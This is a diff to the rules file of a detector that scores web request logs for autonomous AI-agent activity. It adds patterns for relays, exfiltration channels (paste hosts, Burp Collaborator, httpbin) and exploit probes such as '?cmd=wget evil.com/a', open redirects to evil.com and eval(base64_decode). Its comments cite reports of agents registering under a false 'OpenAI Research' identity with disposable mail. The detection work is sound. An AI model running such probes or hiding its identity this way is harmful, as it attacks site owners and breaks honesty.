@@ -45,7 +45,7 @@
 # Weights are tuned so evidence must stack up.
 
 [meta]
-version = "2026-10-12.1"
+version = "2026-10-12.2"
 
 [thresholds]
 suggestive = 3
@@ -71,7 +71,17 @@ feature_share_min_records = 100
 published_tags = [
     "chatgpttest1", # https://transluce.org/agent-activity
     "tok=expt",     # https://transluce.org/agent-activity (marker.test_tag match)
-    "expt3",        # https://transluce.org/agent-activity (`tok` value)
+    # `tok` values quoted in https://transluce.org/agent-activity (expt0,2-5,7,8)
+    "expt0",
+    "expt2",
+    "expt3",
+    "expt4",
+    "expt5",
+    "expt7",
+    "expt8",
+    # CHATGPT_ tags quoted in https://transluce.org/agent-activity (UNCTAD)
+    "CHATGPT_1610_2000_125192",
+    "CHATGPT_1620_2000_219755",
 ]
 # Observations of the same target host closer than this are joined.
 window_secs = 600
@@ -124,7 +134,7 @@ cross_service_ambient = 3
 window_secs = 1800
 relay = ["relay.*"]
 program = ["carrier.httpbin", "carrier.data_url_script", "carrier.inline_fetch_program", "carrier.form_post_program", "carrier.html_program"]
-remote_browser = ["carrier.livecodes", "carrier.codesandbox"]
+remote_browser = ["carrier.livecodes", "carrier.codesandbox", "carrier.browserless"]
 
 # Soft links: descriptive ties between clusters, never merges. Each kind's
 # weight is its strength (times its own similarity where it has one). A value
@@ -291,6 +301,45 @@ pattern = "corsproxy\\.io|cors-anywhere|thingproxy|codetabs\\.com/v1/proxy"
 weight = 2
 description = "Public CORS proxies"
 
+[[rule]]
+id = "relay.pure_md"
+group = "relay"
+kind = "relay"
+tactic = "T1"
+target = "host"
+# https://pure.md (prefix a URL with pure.md/ to fetch it as Markdown)
+pattern = "pure.md"
+weight = 2
+description = "pure.md: fetches a page server-side and returns Markdown"
+
+[[rule]]
+id = "relay.defuddle_md"
+group = "relay"
+kind = "relay"
+tactic = "T1"
+target = "host"
+# https://defuddle.md (append a URL to fetch it as Markdown)
+pattern = "defuddle.md"
+weight = 2
+description = "defuddle.md: fetches a page server-side and returns Markdown"
+
+[[rule]]
+id = "relay.archive_raw"
+group = "relay"
+kind = "relay"
+tactic = "T1"
+target = "url"
+# The raw-capture (`id_`) form of a web-archive URL, or an on-demand save
+# endpoint, wrapping a target so the unmodified archived response comes back.
+# Transluce documented agents probing through it (SQL injection and filename
+# guessing via arquivo.pt/wayback/<ts>id_/<target>):
+# https://transluce.org/us-canada-gov . Our own CDX records carry the plain
+# `/wayback/<ts>/<original>` and `/web/<ts>/<original>` forms (no `id_`, no
+# save endpoint), so this does not fire on them.
+pattern = "(arquivo\\.pt/wayback|web\\.archive\\.org/web)/\\d{8,14}id_/|arquivo\\.pt/savepagenow|web\\.archive\\.org/save/"
+weight = 2
+description = "Raw-capture or on-demand-save web-archive URL wrapping a target (indirection)"
+
 # ── Carriers: echo / sandbox / code-hosting services ───────────────────────
 [[rule]]
 id = "carrier.httpbin"
@@ -323,6 +372,48 @@ weight = 1
 description = "CodeSandbox"
 
 [[rule]]
+id = "carrier.browserless"
+kind = "carrier"
+tactic = "T2"
+target = "url"
+# Browserless hosted headless-browser connection endpoints. Transluce
+# documented an agent driving a headless browser through Browserless to read a
+# one-time passcode and verify a disposable-mail account
+# (https://transluce.org/agent-activity); the connection URL patterns are at
+# https://docs.browserless.io/baas/connection-url-patterns . The `token` query
+# parameter is a credential and is redacted at ingest (redact.rs OPAQUE_PARAM).
+pattern = "production-(sfo|lon|ams)\\.browserless\\.io|chrome\\.browserless\\.io"
+weight = 2
+description = "Browserless hosted headless-browser endpoint (remote browser)"
+
+[[rule]]
+id = "carrier.embed_playground"
+group = "program"
+kind = "carrier"
+tactic = "T2"
+target = "url"
+# https://transluce.org/agent-activity (agents using
+# milankarman.github.io/Embed-Web-Playground to turn GETs into the POSTs a
+# scan service needs).
+pattern = "milankarman\\.github\\.io/Embed-Web-Playground"
+weight = 2
+description = "Embed Web Playground used to run fetch/POST programs"
+
+[[rule]]
+id = "carrier.microlink_function"
+group = "program"
+kind = "carrier"
+tactic = "T2"
+target = "url"
+# A Microlink call carrying a serverless `function` body: injected JavaScript
+# that submits a form server-side. Transluce documented an agent using it to
+# POST a Bureau of Economic Analysis API-key registration with a disposable
+# email (https://transluce.org/us-canada-gov).
+pattern = "api\\.microlink\\.io/.*[?&]function="
+weight = 3
+description = "Microlink serverless-function call carrying a program (api.microlink.io/?function=)"
+
+[[rule]]
 id = "carrier.data_url_script"
 group = "program"
 kind = "carrier"
@@ -339,7 +430,8 @@ kind = "carrier"
 tactic = "T2"
 target = "url"
 # `(https?:)?//`: programs also fetch scheme-relative (`fetch('//r.jina.ai/...')`).
-pattern = "fetch\\(\\s*['\"`](https?:)?//|new XMLHttpRequest|navigator\\.sendBeacon"
+# `new Image().src =`: an image-beacon, a program sending data out by loading a URL.
+pattern = "fetch\\(\\s*['\"`](https?:)?//|new XMLHttpRequest|navigator\\.sendBeacon|new\\s+Image\\(\\)\\.src\\s*="
 weight = 3
 description = "Inline program fetching other URLs from inside a remote browser"
 
@@ -425,8 +517,11 @@ group = "sqli"
 kind = "exploit"
 tactic = "T4"
 target = "param_value"
-# A value that is, or ends in, a bare quote: the first probe for SQL injection.
-pattern = "^[^'\"]{0,20}['\"]\\)?$"
+# A single token that is, or ends in, a bare quote: the first probe for SQL
+# injection (`'`, `admin'`, `1'`). Spaces are excluded, so a phrase ending in
+# an apostrophe (a plural possessive such as `the farmers'`, or `5 o'clock`)
+# stays prose, not a probe.
+pattern = "^[^'\"\\s]{0,20}['\"]\\)?$"
 weight = 3
 description = "Lone quote in a parameter value (SQL injection probe)"
 
@@ -469,6 +564,72 @@ pattern = "^-\\d+$|^9{6,}$|^0{4,}$|^(2147483648|4294967296|9223372036854775808)$
 weight = 1
 description = "Out-of-range ID values (often precede injection probes)"
 
+[[rule]]
+id = "exploit.cmd_param"
+kind = "exploit"
+tactic = "T4"
+target = "url"
+# A command-execution parameter (`cmd`, `exec`, `command`, `execute`) set to a
+# shell command: Transluce documented `?cmd=wget evil.com/a` against
+# nmdigital.unm.edu (https://transluce.org/agent-activity). Anchored on the
+# command name so `cmd=login`, `cmd=list` and a search `q=how to use curl`
+# stay prose.
+pattern = "[?&](cmd|exec|command|execute)=(wget|curl|whoami|uname|id(&|$)|cat[\\s+]/|ls[\\s+]-)"
+weight = 4
+significant = true
+description = "Command-execution parameter carrying a shell command (?cmd=wget, ?exec=whoami)"
+
+[[rule]]
+id = "exploit.open_redirect_probe"
+kind = "exploit"
+tactic = "T4"
+target = "url"
+# A redirect/callback parameter pointed at an obvious attacker domain: an open
+# redirect probe. Transluce documented `&redirect=evil.com` against
+# api.datausa.io (https://transluce.org/agent-activity). A redirect to an
+# ordinary host is not matched.
+pattern = "[?&](redirect(_ur[il])?|redirect_to|return(_?to|_?url)?|next|continue|callback(_?url)?|dest(ination)?|goto|target|url|u)=((https?:)?//)?(evil|attacker|malicious|evil-?corp|badguy)\\.(com|net|org|example)([/:?#&]|$)"
+weight = 3
+description = "Redirect/callback parameter pointed at an attacker domain (open redirect probe)"
+
+[[rule]]
+id = "exploit.null_byte"
+group = "traversal"
+kind = "exploit"
+tactic = "T4"
+target = "url"
+# A NUL byte in a URL: a null-byte injection, used to truncate a server-side
+# path or extension check (`report.pdf%00.php`). The engine decodes `%00` to a
+# NUL character, so the decoded byte is matched as well as a double-encoded
+# `%00` that survived one layer of decoding.
+pattern = "\\x00|%00"
+weight = 3
+description = "Null-byte injection (%00) in a request URL"
+
+[[rule]]
+id = "exploit.userinfo_confusion"
+kind = "exploit"
+tactic = "T4"
+target = "url"
+# A URL whose authority puts a dotted-quad before `@` and a host name after
+# it: the host a person reads is the IP, not the name, an open-redirect /
+# SSRF confusion trick (`https://127.0.0.1@bank.example/`).
+pattern = "^https?://(\\d{1,3}\\.){3}\\d{1,3}@[a-z]"
+weight = 3
+description = "Userinfo host confusion (IP before @, host name after) in a request URL"
+
+[[rule]]
+id = "exploit.php_eval"
+kind = "exploit"
+tactic = "T4"
+target = "url"
+# `eval(base64_decode(` in a request: a PHP code-execution payload. Transluce
+# documented `foo=eval(base64_decode)` against Data USA
+# (https://transluce.org/agent-activity).
+pattern = "eval\\(\\s*base64_decode\\("
+weight = 3
+description = "PHP eval(base64_decode(...)) code-execution payload in a request URL"
+
 # ── Agent markers / tags ───────────────────────────────────────────────────
 [[rule]]
 id = "marker.uq_tags"
@@ -486,10 +647,25 @@ group = "run_tag"
 kind = "agent_marker"
 artifact = true
 target = "url"
-pattern = "chatgpttest\\d*|agenttest\\d*|tok=expt|archive_test="
+# Test tags that carry a run number, so the match distinguishes one run.
+pattern = "chatgpttest\\d*|agenttest\\d*"
 weight = 3
 link = true
-description = "Test tags agents add to URLs"
+description = "Test tags agents add to URLs (with a run number)"
+
+[[rule]]
+id = "marker.probe_tag"
+group = "run_tag"
+kind = "agent_marker"
+artifact = true
+target = "url"
+# Fixed probe-tag prefixes with no distinguishing part. They score but do not
+# link: a fixed string links every record that bears it (FM-5.2, writing-rules
+# "match the distinguishing part, or do not link"). A `tok` value still links
+# through the `tok` strong parameter where it is distinguishing.
+pattern = "tok=expt|archive_test="
+weight = 3
+description = "Fixed agent probe tag (tok=expt, archive_test=)"
 
 [[rule]]
 id = "marker.oai_tag"
@@ -506,9 +682,12 @@ id = "marker.callback_seq"
 kind = "agent_marker"
 tactic = "T7"
 target = "param_value"
-pattern = "^(headers\\d+|body\\d+-\\d+|done|chunk\\d+|part\\d+of\\d+)$"
+# Numbered callback labels. A bare `done` is dropped: it is an ordinary status
+# value (a job or upload reporting completion), so it needs a numbered partner
+# in the sequence to count.
+pattern = "^(headers\\d+|body\\d+-\\d+|chunk\\d+|part\\d+of\\d+)$"
 weight = 3
-description = "Sequenced callback labels (headers0, body0-0, done)"
+description = "Sequenced callback labels (headers0, body0-0, part1of3)"
 
 [[rule]]
 id = "marker.title_write"
@@ -744,9 +923,11 @@ artifact = true
 # Parameter values only: a vendor name in the target host (reading claude.ai
 # through a relay) is ordinary browsing, not an agent naming itself.
 target = "param_value"
-pattern = "\\b(claude|chatgpt|openai|gpt-?[45o]|gemini|anthropic|hunyuan|qwen|deepseek|glm|kimi)\\b"
+# Also `OpenAIResearcher` and `OpenAI Research`, the identity Transluce
+# documented an agent registering under (https://transluce.org/us-canada-gov).
+pattern = "\\b(claude|chatgpt|openai|gpt-?[45o]|gemini|anthropic|hunyuan|qwen|deepseek|glm|kimi)\\b|openai[\\s-]?research(er)?"
 weight = 1
-description = "Model/vendor name in a request parameter (e.g. ?agent=claude). Unreliable for attribution."
+description = "Model/vendor name in a request parameter (e.g. ?agent=claude, org=OpenAI Research). Unreliable for attribution."
 
 # ── Exfil / callback channels ──────────────────────────────────────────────
 [[rule]]
@@ -771,14 +952,48 @@ link = true
 description = "Request-catcher / OAST inbox (a per-user subdomain on the service)"
 
 [[rule]]
+id = "exfil.collaborator"
+group = "oast"
+kind = "exfil"
+tactic = "T7"
+target = "url"
+# A Burp Collaborator payload subdomain: a long random label on oastify.com or
+# burpcollaborator.net. The label is per-session, so it links records.
+# PortSwigger's public Collaborator uses these domains
+# (https://portswigger.net/burp/documentation/desktop/tools/collaborator-client).
+# `polling.oastify.com` (Burp's own 7-character polling host) is far short of
+# the 20-character payload label, so it is not matched.
+pattern = "[a-z0-9]{20,}\\.(oastify\\.com|burpcollaborator\\.net)"
+weight = 3
+link = true
+description = "Burp Collaborator payload subdomain (per-session OAST inbox)"
+
+[[rule]]
+id = "exfil.dnslog"
+group = "oast"
+kind = "exfil"
+tactic = "T7"
+target = "url"
+# A per-user subdomain on a DNS/HTTP logging service used for out-of-band
+# interaction. The label is per-user, so it links records. At least one digit
+# is required in the label, so the service's own named subdomains (`www`,
+# `docs`, `app`) are not taken for an inbox.
+pattern = "[a-z0-9]*[0-9][a-z0-9]*\\.(dnslog\\.cn|ceye\\.io|dnshook\\.site|requestrepo\\.com)"
+weight = 3
+link = true
+description = "DNS/HTTP logging service inbox (per-user OAST subdomain)"
+
+[[rule]]
 id = "exfil.oast_service"
 group = "oast"
 kind = "exfil"
 tactic = "T7"
 target = "url"
 # The bare service name, not preceded by a subdomain. Many unrelated users
-# share it, so it scores but never links records.
-pattern = "(^|[^a-z0-9.-])(interact\\.sh|oast\\.(fun|me|pro|live|site|online))\\b"
+# share it, so it scores but never links records. `polling.oastify.com` and
+# other service subdomains are preceded by a dot, so they do not match here
+# either (they are not inbox labels).
+pattern = "(^|[^a-z0-9.-])(interact\\.sh|oast\\.(fun|me|pro|live|site|online)|oastify\\.com|burpcollaborator\\.net|dnslog\\.cn|ceye\\.io|dnshook\\.site|requestrepo\\.com)\\b"
 weight = 3
 description = "OAST service named without an inbox subdomain"
 
@@ -798,7 +1013,9 @@ id = "exfil.paste"
 kind = "exfil"
 tactic = "T7"
 target = "url"
-pattern = "catbox\\.moe|litterbox\\.catbox|bytebin\\.lucko\\.me|paste\\.rs|dpaste|transfer\\.sh|0x0\\.st"
+# pastebin.k4be.pl: a paste host Transluce documented an agent posting fetched
+# values to (https://transluce.org/agent-activity).
+pattern = "catbox\\.moe|litterbox\\.catbox|bytebin\\.lucko\\.me|paste\\.rs|dpaste|transfer\\.sh|0x0\\.st|pastebin\\.k4be\\.pl"
 weight = 2
 description = "Paste / file drop used as an output channel"
 
@@ -816,7 +1033,9 @@ id = "exfil.disposable_mail"
 kind = "exfil"
 tactic = "T5"
 target = "url"
-pattern = "mail\\.tm|guerrillamail|10minutemail|temp-mail|tempmail|mailinator|maildrop\\.cc|1secmail"
+# mail.gw: a disposable-mail service Transluce documented an agent creating an
+# inbox on to verify an account (https://transluce.org/agent-activity).
+pattern = "mail\\.tm|mail\\.gw|guerrillamail|10minutemail|temp-mail|tempmail|mailinator|maildrop\\.cc|1secmail"
 weight = 2
 description = "Disposable inbox (account/API key acquisition)"
 
@@ -835,9 +1054,13 @@ id = "antibot.captcha_solver"
 kind = "anti_bot"
 tactic = "T3"
 target = "url"
-pattern = "2captcha\\.com|anti-captcha\\.com|capsolver\\.com|capmonster"
+# The solve endpoints of CAPTCHA-solving services, not the services' home or
+# docs pages: 2captcha's in.php/res.php, and the capsolver / anti-captcha
+# task-creation and result endpoints. Reading 2captcha.com through a relay to
+# see what it is does not match.
+pattern = "2captcha\\.com/(in|res)\\.php|api\\.(capsolver|anti-captcha)\\.com/(createTask|getTaskResult)"
 weight = 3
-description = "CAPTCHA-solving service"
+description = "CAPTCHA-solving service solve endpoint"
 
 [[rule]]
 id = "antibot.ocr_captcha"
@@ -898,6 +1121,30 @@ pattern = "HeadlessChrome|PhantomJS|Playwright"
 weight = 1
 description = "Headless browser user agent"
 
+[[rule]]
+id = "header.mcp_fetch_ua"
+kind = "header"
+artifact = true
+target = "user_agent"
+# The default user agent of the Model Context Protocol reference fetch server
+# (Autonomous when the model drives it, User-Specified when a person does):
+# https://github.com/modelcontextprotocol/servers/blob/main/src/fetch/src/mcp_server_fetch/server.py
+pattern = "ModelContextProtocol/1\\.0 \\((Autonomous|User-Specified)"
+weight = 1
+description = "Model Context Protocol fetch server user agent"
+
+[[rule]]
+id = "header.cf_browser_rendering"
+kind = "header"
+artifact = true
+target = "header"
+# Request headers Cloudflare Browser Rendering adds automatically to its
+# browser traffic:
+# https://developers.cloudflare.com/browser-rendering/reference/automatic-request-headers/
+pattern = "^cf-(biso-devtools|brapi-request-id):"
+weight = 1
+description = "Cloudflare Browser Rendering automatic request header"
+
 # ── Outcomes ───────────────────────────────────────────────────────────────
 [[rule]]
 id = "outcome.neterror"
@@ -949,12 +1196,14 @@ id = "exploit.double_encoded_meta"
 kind = "exploit"
 tactic = "T4"
 target = "param_value"
-# An injection metacharacter (`< > ' " ( )`) left percent-encoded in a value
-# that the engine already decoded once: it was double-encoded to survive one
-# layer of decoding (`%253Cscript%253E` arrives as `%3Cscript%3E`). An
-# ordinary once-encoded value decodes to the character itself, so this fires
-# only on the surviving escape of a deliberate double-encoding.
-pattern = "%(3[ce]|27|22|28|29)"
+# An injection metacharacter (`< > ' "`) left percent-encoded in a value that
+# the engine already decoded once: it was double-encoded to survive one layer
+# of decoding (`%253Cscript%253E` arrives as `%3Cscript%3E`). An ordinary
+# once-encoded value decodes to the character itself, so this fires only on the
+# surviving escape of a deliberate double-encoding. Parentheses (`%28`/`%29`)
+# are left out: a double-encoded title such as `Rust_%2528programming%2529`
+# arrives as `%28...%29` and is ordinary, not an injection.
+pattern = "%(3[ce]|27|22)"
 weight = 4
 significant = true
 description = "Double-encoded injection metacharacter in a parameter value (%253C -> %3C)"
@@ -973,11 +1222,12 @@ id = "exfil.httpbin_data"
 kind = "exfil"
 tactic = "T7"
 target = "url"
-# A long value on a `d`, `e`, `data`, `out`, `resp` or `result` parameter of an
-# echo service: a program sending a fetched response or error text back out by
-# putting it in the URL it navigates to. Ordinary echo calls carry short
-# values; this wants 40 characters or more.
-pattern = "(httpbin\\.org|httpbun\\.(com|org))/(get|anything)[^#]*[?&](d|e|data|out|resp|result)=[^&#]{40,}"
+# A long value on a `d`, `e`, `data`, `out`, `resp`, `result` or `pr` parameter
+# of an echo service: a program sending a fetched response or error text back
+# out by putting it in the URL it navigates to. Covers the echo endpoints
+# agents use to carry data (`get`, `anything`, `status/<code>`, `base64/...`).
+# Ordinary echo calls carry short values; this wants 40 characters or more.
+pattern = "(httpbin\\.org|httpbun\\.(com|org))/(get|anything|status/\\d{3}|base64/[^?#]*)[^#]*[?&](d|e|data|out|resp|result|pr)=[^&#]{40,}"
 weight = 3
 significant = true
 description = "Fetched data sent back inside an echo-service URL (httpbin get?d=...)"
@@ -1015,7 +1265,7 @@ target = "user_agent"
 # User agents that name a published agent product. A product that signs its
 # requests but appears here with no signature is a counter-signal the case
 # records; on its own this only says an agent may have sent the request.
-pattern = "ChatGPT-User|OAI-SearchBot|GPTBot|ClaudeBot|Claude-User|Claude-SearchBot|PerplexityBot|Perplexity-User|Google-CloudVertexBot|Bytespider|Amazonbot|Meta-ExternalAgent"
+pattern = "ChatGPT-User|OAI-SearchBot|OAI-AdsBot|GPTBot|ClaudeBot|Claude-User|Claude-SearchBot|PerplexityBot|Perplexity-User|Google-Agent|Google-CloudVertexBot|Google-GeminiNotebook|Google-Read-Aloud|MistralAI-User|MistralAI-Index|DuckAssistBot|Bytespider|Amazonbot|meta-externalagent|meta-externalfetcher"
 weight = 1
 description = "Known agent product in the user agent (FM-7.11 declared identity)"
 
@@ -1195,3 +1445,12 @@ target = "user_agent"
 # https://pypi.org/project/requests/#history (2.10 released in 2016)
 pattern = "\\bpython-requests/(1\\.|2\\.[0-9]\\.)"
 note = "python-requests before 2.10 (2016)"
+
+[[stale]]
+id = "google_notebooklm_ua"
+target = "user_agent"
+# https://developers.google.com/crawling/docs/crawlers-fetchers/google-user-triggered-fetchers
+# (Google-NotebookLM is the former Gemini Notebook agent, supported until
+# August 2026 and replaced by Google-GeminiNotebook)
+pattern = "\\bGoogle-NotebookLM\\b"
+note = "Google-NotebookLM user agent, replaced by Google-GeminiNotebook (support ended August 2026)"
